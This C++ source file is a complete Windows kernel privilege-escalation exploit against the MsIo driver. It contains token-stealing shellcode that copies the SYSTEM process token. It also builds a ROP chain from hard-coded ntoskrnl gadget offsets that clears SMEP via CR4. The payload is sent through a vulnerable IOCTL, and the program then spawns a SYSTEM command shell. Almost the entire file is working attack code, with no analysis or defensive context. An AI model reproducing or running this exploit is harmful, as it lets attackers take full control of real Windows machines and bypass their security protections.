#include <iostream>
#include <string>
#include <Windows.h>
#include <Psapi.h>

#pragma warning( disable : 6387 )


_int64 get_pxe_address(_int64 address)
{
    _int64 result = address >> 9;
    result = result | 0xFFFFF68000000000;
    result = result & 0xFFFF6FFFFFFFFFF8;
    return result;
}


VOID eopMsio(HANDLE hFile, INT64 kernel_base, DWORD pid, DWORD IoControlCode) {


    BYTE token_steal[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
        // Windows 10 1709
        //"\x4D\x8B\x88\xe8\x02\x00\x00"              // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks  - 1709
        // Windows 10 2004
        "\x4D\x8B\x88\x48\x04\x00\x00"              // mov r9, [r8 + 448h]      ; ActiveProcessLinks  - 2004
        "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
        //find_system_proc:
        "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
        "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
        "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
        "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
        "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
        //found_system:
        "\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
        "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
        //find cmd
        "\x48\x8B\x51\xF8"                          // mov rdx, [rcx-8]         ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x81\xFA\x99\x99\x00\x00"              // cmp rdx, 0d54h           ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
        "\x74\x05"                                  // jz found_cmd             ;YES - move on
        "\x48\x8B\x09"                              // mov rcx, [rcx]           ;NO - next entry in list
        "\xEB\xEE"                                  // jmp find_cmd             ;loop
        // found cmd
        "\x48\x89\x41\x70"                          // mov [rcx+70h], rax      ;copy SYSTEM token over top of this process's token
        "\x48\x31\xc0"                              // xor rax rax
        "\x48\xc7\xc1\x78\x06\x37\x00"              // mov rcx, 0x370678 
        "\xc3";                                     // ret                      ; RET

    token_steal[54] = pid;
    token_steal[55] = pid >> 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL,
        sizeof(token_steal),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    printf("[+] Shellcode allocated at: 0x%p\n", allocated_shellcode);

    INT64 VaShellcode = INT64(allocated_shellcode);

    INT64 pxe_address = get_pxe_address(VaShellcode);
    printf("[+] Shellcode PXE should be at: 0x%p\n", pxe_address);
   
    // 2004 264 ROP
    INT64 rop_01 = kernel_base + 0x21f06c;            // 0x0020aefc: pop rcx ; ret
    INT64 rop_02 = 0x00270678;                        // value we want placed in cr4 0x00270678
    INT64 rop_03 = kernel_base + 0x38af57;            // 0x00343257: mov cr4, ecx ; ret
    INT64 rop_04 = kernel_base + 0x36d640;            // 0x00331120: wbinvd; ret
    INT64 rop_05 = kernel_base + 0x230154;            // 0x003a3fe6: add rsp, 0x08 ; ret

    puts("[+] SMEP disabled");

    BYTE payload[128] = { 0 };
    memcpy(payload + 72, (PINT64)&rop_01, 8);                // pop rcx ; ret 
    memcpy(payload + 80, (PINT64)&rop_02, 8);                // disable SMEP value
    memcpy(payload + 88, (PINT64)&rop_03, 8);                // mov cr4, ecx ; ret
    memcpy(payload + 96, (PINT64)&rop_04, 8);                // wbinvd; ret
    memcpy(payload + 104, (PINT64)&allocated_shellcode, 8);  // shellcode
    memcpy(payload + 112, (PINT64)&rop_03, 8);               // mov cr4, ecx ; ret - hint shellcode
    memcpy(payload + 120, (PINT64)&rop_05, 8);               // add rsp, 0x08; ret

    printf("[+] Payload buffer located at: 0x%p\n", payload);

    printf("Attach debugger and press enter to continue\n");
    char c = getchar();

    DWORD lpBytesReturned = 0x0;
    
    BOOL triggerIOCTL = DeviceIoControl(hFile,
        IoControlCode,
        payload,
        sizeof(payload),
        NULL,
        0,
        &lpBytesReturned,
        NULL);

    if (!triggerIOCTL) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    }
    else {
        puts("[+] Enjoy your SYSTEM shell\n");
    }

    system("start cmd.exe");
    
}

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}



//
HANDLE GetDriverHandle() {
    HANDLE hMsio;

    hMsio = CreateFileA("\\\\.\\MsIo",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hMsio == INVALID_HANDLE_VALUE) {
        printf("[-] Error obtaining an handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    return hMsio;
}

int main() {
    DWORD IoControlCode = 0x80102040;
    HANDLE hDevice = GetDriverHandle();
    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    DWORD pid = GetCurrentProcessId();



    eopMsio(hDevice, nt, pid, IoControlCode);

    return 0;
}
